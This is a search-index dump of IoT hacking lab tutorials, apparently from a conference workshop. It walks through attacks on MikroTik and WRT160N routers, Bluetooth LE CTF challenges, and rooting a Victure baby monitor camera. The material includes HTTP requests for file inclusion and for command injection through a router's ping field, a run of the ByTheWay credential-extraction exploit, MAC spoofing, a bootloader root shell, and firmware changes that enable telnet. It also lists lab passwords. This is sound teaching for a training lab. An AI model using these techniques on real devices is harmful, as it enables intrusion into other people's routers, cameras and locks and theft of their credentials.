[{"uri":"https://iot-hack-labs.github.io/victure-pc420/","title":"Victure PC420","tags":[],"description":"","content":"Victure PC420 Baby Monitor Requirements  Victure PC420 baby monitor camera with power cord USB to TTL adapter (Shikra, DSD Tech USB to TTL, etc.) Micro SD (at least 20 MB) Micro SD to USB adapter 3 Female to male jumper wires Computer  "},{"uri":"https://iot-hack-labs.github.io/router-lab/","title":"Router Lab","tags":[],"description":"","content":"WiFi Lab Information SSID: iot-hack-lab Password: saintcon2021 Target CIDR: 172.21.0.1/24 nmap -sn -PS21,22,80,8000,8080 172.21.0.1/24 Please don\u0026rsquo;t ruin things for other people.\n"},{"uri":"https://iot-hack-labs.github.io/btle-labs/","title":"BTLE CTF","tags":[],"description":"","content":"BTLE CTF About This lab walks through some tools that are used for hacking Bluetooth Low Energy (BLE). Our target is a Bluetooth CTF project designed to allow users to learn about core concepts of Bluetooth client and server interactions. (BLE CTF Infinity)\nTips for this lab ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è BLE devices are finicky. Here are some helpful tips for this lab:\n Run commands multiple times if you get errors. Remove and re insert the Bluetooth dongle. Most of the time you can skip ahead in the lab if it just isn\u0026rsquo;t working.  "},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/","title":"Discovery","tags":[],"description":"","content":"About This will guide you how to exploit a Mikrotik running Router Os.\nDiscovery  First, run nmap against the target to discover what ports are open.   -Pn: scan the device even though its not responding to ping. --top-ports=4000 will scan the top 4000 most common service ports. The default is 1000, and will miss one of the open ports.  nmap 172.21.0.4 --top-ports=4000 -Pn You should see that there are 2 open ports, 21 and 8291.\nnmap 172.21.0.4 --top-ports=4000 -Pn Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:20 MDT Nmap scan report for 172.21.0.4 Host is up (0.0047s latency). PORT STATE SERVICE 21/tcp open ftp 8291/tcp open unknown Do service discovery on the open ports by using the -sC flag.  $ nmap 172.21.0.4 -p21,8291 -sC -Pn We should get back some additional information about what services are running.\n$ nmap 172.21.0.4 -p21,8291 -sC -Pn PORT STATE SERVICE 21/tcp open ftp | ftp-syst: |_ SYST: UNIX MikroTik 6.39.2 8291/tcp open unknown Nice. Now we know that this router is running MikroTik version 6.39.2.\n"},{"uri":"https://iot-hack-labs.github.io/btle-labs/01-getting-started/","title":"Getting Started","tags":[],"description":"","content":"Devices Because it may be difficult to scan for all Bluetooth devices in such a crowded area, the BLE_CTF_INFINITY MAC addresses for each challenge are provided below.\nChallenge 0: 94:B9:7E:DA:08:56 Challenge 1: 08:3A:F2:7D:65:8A Challenge 2: 94:B9:7E:FA:27:72 Challenge 3: 94:B9:7E:F9:21:B6  Tools We can use a few different tools to solve some BLE CTF Infinity challenges.\n hciconfig bleah gatttool  Hciconfig You can view BLE interfaces on you system by using the hciconfig command. You should see at least one interface.\nGatttool We use gatttool to read and write values to service handles.\n$ gatttool -b 94:B9:7E:DA:08:56 --char-read-a 0x0016 Bleah Although actually deprecated in favor of Bettercap, it may be easier to use bleah to target which device to enumerate characteristics.\n‚ö†Ô∏è Bleah has been deprecated in favor of Bettercap and may not be available.\nBettercap $ sudo bettercap \u0026gt; ble.recon on "},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/","title":"Local File Inclusion","tags":[],"description":"","content":"Local File Inclusion Make an HTTP POST request to the router like the following:\nPOST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_type=wsc_method2\u0026amp;change_action=gozila_cgi\u0026amp;next_page=../..{FILE} NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/","title":"MikroTik","tags":[],"description":"","content":"Mikrotik (Router OS 6.39.2) Host: 172.21.0.4 "},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/","title":"OS Command Injection","tags":[],"description":"","content":"OS Command Injection Make an HTTP POST request to the router like the following:\nPOST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_button=Diagnostics\u0026amp;change_action=gozila_cgi\u0026amp;submit_type=start_ping\u0026amp;action=\u0026amp;commit=0\u0026amp;ping_ip=1.1.1.1\u0026amp;ping_size=|{URL_ENCODED_CMD}|\u0026amp;ping_times=5\u0026amp;traceroute_ip= NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/","title":"WRT160N","tags":[],"description":"","content":"WRT160N Host: 172.21.0.15 User: admin password: LvawK!*C@6MR!Cz#*V2$ze@#7v75iT Must be on the Wifi documented here.\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/","title":"Exploitation","tags":[],"description":"","content":"After searching online, we find that the version of Mikrotik/RouterOS should be vulnerable to an exploit called \u0026ldquo;By The Way\u0026rdquo;\nExploitation The following versions of Router OS are vulnerable to \u0026ldquo;ByTheWay\u0026rdquo; exploit:\nLongterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The Tenable security team has created a POC for the \u0026ldquo;By The Way\u0026rdquo; exploit, found here: https://github.com/tenable/routeros/tree/master/poc/bythewayThe repo is already cloned, and the exploit compiled.\n Navigate to ~/routeros/poc/bytheway/build  cd ~/routeros/poc/bytheway/build Run the exploit against the Mikrotik  ./btw -i 172.21.0.4 You should see the following:\n$ ./btw -i 172.21.0.4 ‚ïî‚ïó ‚î¨ ‚î¨ ‚îå‚î¨‚îê‚î¨ ‚î¨‚îå‚îÄ‚îê ‚ï¶ ‚ï¶‚îå‚îÄ‚îê‚î¨ ‚î¨ ‚ï†‚ï©‚ïó‚îî‚î¨‚îò ‚îÇ ‚îú‚îÄ‚î§‚îú‚î§ ‚ïë‚ïë‚ïë‚îú‚îÄ‚î§‚îî‚î¨‚îò ‚ïö‚ïê‚ïù ‚î¥ ‚î¥ ‚î¥ ‚î¥‚îî‚îÄ‚îò ‚ïö‚ï©‚ïù‚î¥ ‚î¥ ‚î¥ [+] Attempting to connect to 172.21.0.4:8291 [+] Extracting user.dat... [+] Searching for administrator credentials [+] Using credentials - [[[CREDENTIALS HERE]]] [+] Creating /pckg/option on 172.21.0.4:8291 [+] Creating /flash/nova/etc/devel-login on 172.21.0.4:8291 [+] There's a light on  We see that the exploit has extracted credentials for the admin user.\n  Login to FTP using the creds you got in step 2.\n  $ ftp 172.21.0.4 Use the username and password to login.\nName (172.21.0.4:user): admin 331 Password required for admin Password: 230 User admin logged in Remote system type is UNIX. Set the mode to Passive\nftp\u0026gt; passive Passive mode on. List the directory\nftp\u0026gt; ls 227 Entering Passive Mode (172,21,0,4,191,152). 150 Opening data connection -rw-rw---- 1 root root 59 Oct 18 12:47 flag.txt drwxrwx--- 1 root root 1024 Dec 31 18:00 flash 226 Transfer complete Get the flag!\nftp\u0026gt; get flag.txt local: flag.txt remote: flag.txt 227 Entering Passive Mode (172,21,0,4,208,214). 150 Opening ASCII mode data connection for /flag.txt (59 bytes) 226 ASCII transfer complete 59 bytes received in 0.00 secs (61.0999 kB/s) Exit FTP\nftp\u0026gt; exit 221 Closing Print the flag. Use this to solve the Hacker Challenge.  $ cat flag.txt "},{"uri":"https://iot-hack-labs.github.io/btle-labs/02-flag0/","title":"Flag0","tags":[],"description":"","content":"Use bettercap to enumerate the characteristics on the device.\n$ sudo bettercap \u0026gt; ble.recon on \u0026gt; ble.enum 94:B9:7E:DA:08:56 ‚ö†Ô∏è Try this a few times if it doesn\u0026rsquo;t work and/or removing and plugging in the bluetooth dongle.\nFor the flag 0, we see that the \u0026lsquo;Device Name\u0026rsquo; kinda looks like a flag.\n"},{"uri":"https://iot-hack-labs.github.io/btle-labs/03-flag1/","title":"Flag1","tags":[],"description":"","content":"Use Bettercap to Enumerate All Characteristics At this point, if we try to use bleah to enumerate the characteristics, we see that bleah shows us some interesting values.\n$ sudo bleah -b 08:3A:F2:7D:65:8A -e When enumerating, the value at handle 0x002a returns goodbye üëã. This disconnects the device. We have to use another tool to target reading the other values.\nUse Gatttool to Read Characteristics Read the value at 0x002c using gatttool.\n$ gatttool -b 08:3A:F2:7D:65:8A --char-read -a 0x002c The value at 0x002c decoded looks like our flag :)\n"},{"uri":"https://iot-hack-labs.github.io/btle-labs/04-flag2/","title":"Flag2","tags":[],"description":"","content":"View Gatt Table After switching to challenge 2, use bettercap to enumerate its characteristics again.\n$ sudo bettercap \u0026gt; ble.recon on \u0026gt; ble.enum 94:B9:7E:FA:27:72 We see that there is some authentication required, and that we should connect with pin 0000. We can do this with gatttool.\nUse Gatttool with Authentication $ gatttool --sec-level=high -b 94:B9:7E:FA:27:72 --char-read -a 0x002c This will prompt you for the pin. Enter 0000 and click OK.\nAfter authenticating, it will then print the value of 0x002c.\nUsing Cyberchefwe see\n35 64 36 39 36 63 64 66 35 33 61 39 31 36 63 30 61 39 38 64 decodes to\n5d696cdf53a916c0a98d "},{"uri":"https://iot-hack-labs.github.io/btle-labs/05-flag3/","title":"Flag3","tags":[],"description":"","content":"View Gatt Table Use bettercap to enumerate its characteristics again.\n$ sudo bettercap \u0026gt; ble.recon on \u0026gt; ble.enum 94:B9:7E:F9:21:B6 We can see that it is looking for a device with the MAC address 11:22:33:44:55:66 to connect to it.\nView the Interface MAC Address Use hciconfig to view the MAC address of the interface.\nSpooftooph We can spoof our mac address with the tool spooftooph. (Make sure to use sudo)\n$ sudo spooftooph -i hci0 -a 11:22:33:44:55:66 Once we have done this, we need to reset the interface for the changes to take.\n$ sudo hciconfig hci0 reset Now hciconfig should show the new MAC.\nRead the Gatt Table with Spoofed MAC Using bettercap with the spoofed MAC we can now read the flag: 0ad3fe0c58e0a47b8afb.\n"},{"uri":"https://iot-hack-labs.github.io/btle-labs/09-outro/","title":"Finishing up","tags":[],"description":"","content":"References  https://github.com/hackgnar/ble_ctf_infinity Chapter 11 of Practical IoT Hackingfrom No Starch Press.  "},{"uri":"https://iot-hack-labs.github.io/btle-labs/99-ultraloq-ul3/","title":"Ultraloq-UL3","tags":[],"description":"","content":"Ultraloq UL3 Find the firmware version that is being broadcasted by the Ultraloq UL3 Bluetooth enabled lock.\nThis can be done using some different tools.\nBettercap Because there are so many BLE devices in crowded areas, we will provide you the MAC address of the Ultraloq UL3:\n78:DB:2F:DA:BA:3B\rYou can also use a tool like bettercap to find this.\n$ sudo bettercap\r\u0026gt; ble.recon on\rYou will have to turn off recon shortly after starting it because there are so many devices.\n\u0026gt; ble.enum 78:DB:2F:DA:BA:3B\rBleah If bleah is available on a lab machine or your own device, you can also try:\n$ sudo bleah -b 78:DB:2F:DA:BA:3B -e\rNote: this project has been deprecated in favor of Bettercap.\nBT Inspector Mobile App Download and install an app like BT Inspector:\niOS Android TBD\n"},{"uri":"https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/","title":"Micro SD","tags":[],"description":"","content":"Micro SD The micro SD must be FAT32 formatted. The following steps can be skipped if your micro SD is already FAT32 formatted.\nPartitioning When the micro SD card is plugged in, run the following to determine the micro SD\u0026rsquo;s block device on the computer\nkali@kali:~$ sudo fdisk -l Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors Disk model: VMware Virtual S Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x0852c5cd Device Boot Start End Sectors Size Id Type /dev/sda1 * 2048 165771263 165769216 79G 83 Linux /dev/sda2 165773310 167770111 1996802 975M 5 Extended /dev/sda5 165773312 167770111 1996800 975M 82 Linux swap / Solaris Disk /dev/sdb: 3.69 GiB, 3965714432 bytes, 7745536 sectors Disk model: Storage Device Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x29a1987d In this case, the block device for the micro SD is /dev/sdb\nWe will use fdisk to create a partition on the card.\nkali@kali:~$ sudo fdisk /dev/sdb Welcome to fdisk (util-linux 2.37.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): n Partition type p primary (0 primary, 0 extended, 4 free) e extended (container for logical partitions) Select (default p): [ENTER] Using default response p. Partition number (1-4, default 1): [ENTER] First sector (2048-7745535, default 2048): [ENTER] Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-7745535, default 7745535): [ENTER] Created a new partition 1 of type \u0026#39;Linux\u0026#39; and of size 3.7 GiB. Command (m for help): w The partition table has been altered. Calling ioctl() to re-read partition table. Syncing disks. Where,\n Command (m for help): n: Adds a new partition Select (default p): [ENTER]: The default p is used. p will mark the partition as the primary partition First sector (2048-7745535, default 2048): [ENTER]: Sets the starting point of the partition at the default point. In this case, it is at the 2048 byte offset Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-7745535, default 7745535): [ENTER]: Sets the ending point of the partition at the default point. In this case, it is at the very end of the micro SD card Command (m for help): w: Writes the table to disk and exits  Running fdisk again will show the new partition on the card.\nkali@kali:~$ sudo fdisk /dev/sdb -l Disk /dev/sdb: 3.69 GiB, 3965714432 bytes, 7745536 sectors Disk model: Storage Device Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x29a1987d Device Boot Start End Sectors Size Id Type /dev/sdb1 2048 7745535 7743488 3.7G 83 Linux The new partition is located at /dev/sdb1 for this card.\nFormatting Now that the card is partitioned, it can be FAT32 formatted. To do that, simply run the following\nkali@kali:~$ sudo mkfs.fat /dev/sdb1 "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/","title":"UART to U-Boot","tags":[],"description":"","content":"UART to U-Boot We will now connect to the Victure camera via the USB to TTL adapter.\nConnect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer\nNow connect the male ends of the jumper cables to the camera\u0026rsquo;s UART ports according to the following table\n   Adapter Camera     GND GND   TX RX   RX TX    screen can be used to connect to serial consoles. To connect to the adapter, run the following\nscreen /dev/ttyUSB0 115200 Where,\n /dev/ttyUSB3: Linux serial port for the USB to TTL adapter 115200: The baud rate (i.e. communication speed). 115200 is often the baud rate of UART devices.  Note: Your serial port might not be /dev/ttyUSB3. You can disconnect the adapter from the computer, run ls /dev, reconnect the adapter and run ls /dev to determine the correct serial port to use.\nIt is now time to power the camera. Before doing so, make sure you are ready to press any key in the terminal where you ran the screen command to connect to the adapter\u0026rsquo;s serial console.\nOnce the camera is powered on, you should see something like this in the screen session\nU-Boot 2013.10.0-AK_V3.0.05 (Jan 11 2021 - 08:10:47) DRAM: 64 MiB 8 MiB Create flash partition table init OK! ak_sdhsmmc_init: ANYKA SDHC/MMC4.0: 0 Load Env CRC OK! In: serial Out: serial Err: serial reset pin value: 1 Hit any key to stop autoboot: 1 Press any key to stop the autoboot process. The following shell prompt should be shown\nanyka$ Note: If you weren\u0026rsquo;t fast enough, just simply disconnect and reconnect the power and try again.\n"},{"uri":"https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/","title":"U-Boot to Root","tags":[],"description":"","content":"U-Boot to Root The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.\nanyka$ help ? - alias for \u0026#39;help\u0026#39; base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.sqsh4 tftp downimage- downimage - download and write All-Image to FLASH device,partiton table from ENV partition. downjffs2fs- load usr.jffs2 tftp downkernel- load uImage tftp ...\u0026lt;omitted for brevity\u0026gt;... This U-Boot shell can be used to drop us into a root shell. To do so, run the following\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M saveenv Saving Environment to SPI Flash... Env save done OK Where,\n setenv bootargs args...: Sets the command line arguments that are passed to the kernel. The change here is init=/bin/sh. This means that instead of running /init when fully booted, /bin/sh will be run. saveenv: Saves the environment to Flash memory.  Now disconnect and reconnect the power to the camera. Once fully booted, you should be dropped into a shell.\n/ # ls -lah total 3 drwxrwxr-x 13 1024 1028 162 Mar 2 2021 . drwxrwxr-x 13 1024 1028 162 Mar 2 2021 .. drwxr-xr-x 2 1024 1028 2.3K Oct 28 2019 bin drwxr-xr-x 3 0 root 0 Jan 1 00:00 dev drwxr-xr-x 5 1024 1028 283 Mar 2 2021 etc -rwxr-xr-x 1 1024 1028 2.7K Nov 22 2017 init drwxr-xr-x 3 1024 1028 816 Feb 9 2021 lib drwxr-xr-x 2 1024 1028 3 Feb 9 2017 mnt drwxr-xr-x 2 1024 1028 3 Feb 9 2017 proc drwxr-xr-x 2 1024 1028 1.4K Mar 2 2021 sbin drwxr-xr-x 2 1024 1028 3 Feb 9 2017 sys drwxr-xr-x 2 1024 1028 3 Feb 9 2017 tmp drwxr-xr-x 2 1024 1028 3 Mar 2 2021 usr drwxr-xr-x 3 1024 1028 26 Apr 14 2017 var "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/","title":"Configure Remote Connection","tags":[],"description":"","content":"Configure Remote Connection We have successfully been dropped into a root shell on the camera, but this required physical access. We are next going to update the camera\u0026rsquo;s firmware to run telnetd upon booting up, allowing us to connect to it remotely.\nDump Firmware The first step in enabling remote connections is to dump the camera\u0026rsquo;s firmware.\nYou may notice that, though we have shell, basic commands like whoami seem to give errors\n/ # whoami whoami: unknown uid 0 This is because we bypassed the initialization scripts that would mount file systems and start and configure certain services.\nWe could simply run /init but the camera\u0026rsquo;s services all output to stdout which make it nearly impossible to use the shell. Thankfully, the services will log to a specific file if it exists when they are run.\nRun the following to ensure the services will only log to a file\nmount /mnt \u0026amp;\u0026amp; mkdir /mnt/debug \u0026amp;\u0026amp; touch /mnt/debug/log.txt Where,\n mount /mnt: Mounts the /mnt directory according to the /etc/fstab file mkdir /mnt/debug \u0026amp;\u0026amp; touch /mnt/debug/log.txt: Creates the debug directory and the log file the services will log to  Now we can safely run the initialization scripts. The scripts output to the console then start executing services in the background, dropping you back in the shell\n/etc/init.d/rcS mount all file system... mount: according to /proc/mounts, tmpfs is already mounted on /mnt starting mdev... ************************** Love Linux ! ! ! ************************** 200+0 records in 200+0 records out 102400 bytes (100.0KB) copied, 0.024803 seconds, 3.9MB/s find: insmod: No such file or directory aksensor_module_init aksensor 0-0001: Sensor ID error Running whoami shows us that the system has been initialized\n~ # whoami root Because we will be connecting remotely later on, lets update root\u0026rsquo;s password to something we know\n~ # passwd Changing password for root New password: Bad password: too short Retype password: Password for root changed by root Note: For the purpose of this guide, a simple password was used. It is advised to use a stronger password to avoid being easily compromised.\nConnect the micro SD card to the camera and run the following:\nmkdir /mnt/firmware cp /dev/mtdblock* /mnt/firmware/ Where,\n cp /dev/mtdblock* /mnt/firmware/: Copies the block devices that contain the firmware over to the micro SD card  Modify firmware The block device that we need to modify is just a squashfs filesystem file. To extract the files from the firmware, lets install the squashfs tools\nsudo apt install squashfs-tools Now connect the micro SD to the computer and mount the card\nsudo mkdir /mnt/pc420 sudo mount /dev/sdb1 /mnt/pc420 Now run the following to unsquash the root filesystem:\nunsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4 Parallel unsquashfs: Using 6 processors 320 inodes (338 blocks) to write [===================-] 338/338 100% created 302 files created 17 directories created 18 symlinks created 0 devices created 0 fifos created 0 sockets Where,\n unsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4: Unsquashes the mtdblock4 squashfs file and extracts the files to the rootfs directory  Now we are going to update the initialization scripts to start telnet and ftp upon boot. Edit rootfs/etc/init.d/rcS and uncomment lines 7 and 8\necho \u0026#34;start telnet......\u0026#34; telnetd \u0026amp; Edit rootfs/etc/init.d/rc.local and uncomment line 13\n/bin/tcpsvd 0 21 ftpd -w / -t 600 \u0026amp; Build firmware Now that we have modified the initialization scripts, we are going to \u0026lsquo;resquash\u0026rsquo; the files\nmksquashfs rootfs /mnt/pc420/root.sqsh4 -comp xz Where,\n rootfs: The path to the directory containing the filesystem /mnt/pc420/root.sqsh4: The destination of the resulting squashfs file -comp xz: Compress the filesystem using xz  Once complete, unmount the micro SD card\nsudo umount /mnt/pc420 Update camera firmware Now that we have the modified squashfs file, we can update the camera\u0026rsquo;s firmware. Plug the micro SD into the camera and run the following\n/usr/sbin/update.sh Where,\n /usr/sbin/update.sh: Runs the script to update the camera\u0026rsquo;s firmware  The camera should reboot once it is done updating.\nConnect camera to WiFi Now that the firmware has been updated, we no longer need to boot to /bin/sh. To change the bootargs, follow the steps taken in the UART to U-Boot section to get into the U-Boot shell and run the following:\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/init mem=64M memsize=64M saveenv Saving Environment to SPI Flash... Env save done OK Now disconnect and reconnect the power to the camera. The camera should not boot into a shell but should run our modified initialization scripts.\nWe now need to connect the camera to the WiFi. The first step to do this is to connect the computer to the WiFi the camera is broadcasting. The camera\u0026rsquo;s WiFi SSID should start with \u0026lsquo;Victure_\u0026rsquo;.\nOnce connected, run the following on the computer, replacing PASSWORD and SSID with the password and SSID of the WiFi it should connect to:\ngen_qr_code_str(){ qrcode_header=\u0026#39;\\x68\\x00\\x00\\x00\\x80\u0026#39; victure_user=\u0026#34;95c992cdf31fc7d0\u0026#34; timezone=\u0026#34;-7.00\u0026#34; region=\u0026#34;US\u0026#34; wifi_type=\u0026#34;WPA\u0026#34; wifi_ssid=\u0026#34;$1\u0026#34; wifi_password=\u0026#34;$2\u0026#34; payload=\u0026#34;WIFI:U:$victure_user;Z:$timezone;R:$region;T:$wifi_type;P:\\\u0026#34;$wifi_password\\\u0026#34;;S:$wifi_ssid;\u0026#34; ssidLength=\u0026#34;${#wifi_ssid}\u0026#34; passwordLength=\u0026#34;${#wifi_password}\u0026#34; payloadLength=\u0026#34;${#payload}\u0026#34; lengths=\u0026#34;$passwordLength;$ssidLength;$payloadLength\u0026#34; echo -en \u0026#34;${qrcode_header}L:$lengths;$payload\u0026#34; } gen_qr_code_str \u0026#34;SAINTCON\u0026#34; \u0026#34;saintcon2021\u0026#34; | nc -v 10.1.8.1 6666 This sends the camera all of the info it needs in order to connect to the WiFi. Once done, you should see output in the screen session related to the camera connecting to the WiFi. Make note of the IP that is displayed once it has connected to the WiFi.\nSending select for 192.168.4.46... Lease of 192.168.4.46 obtained, lease time 14400 deleting routes route: SIOCDELRT: No such process adding dns 69.27.0.130 adding dns 69.27.0.131 totalsize [4857755] VmRSS [3672] [4020] VmSize [13104] no network for token interface [wlan0] ip [192.168.4.46] "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/","title":"Test Remote Connection","tags":[],"description":"","content":"Test Remote Connection Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.\ntelnet IP_ADDR Trying 192.168.4.46... Connected to 192.168.4.46. Escape character is '^]'. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux "},{"uri":"https://iot-hack-labs.github.io/","title":"","tags":[],"description":"","content":"IoT Hack Labs Use the left hand navigation to select a tutorial.\n"},{"uri":"https://iot-hack-labs.github.io/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://iot-hack-labs.github.io/tags/","title":"Tags","tags":[],"description":"","content":""}]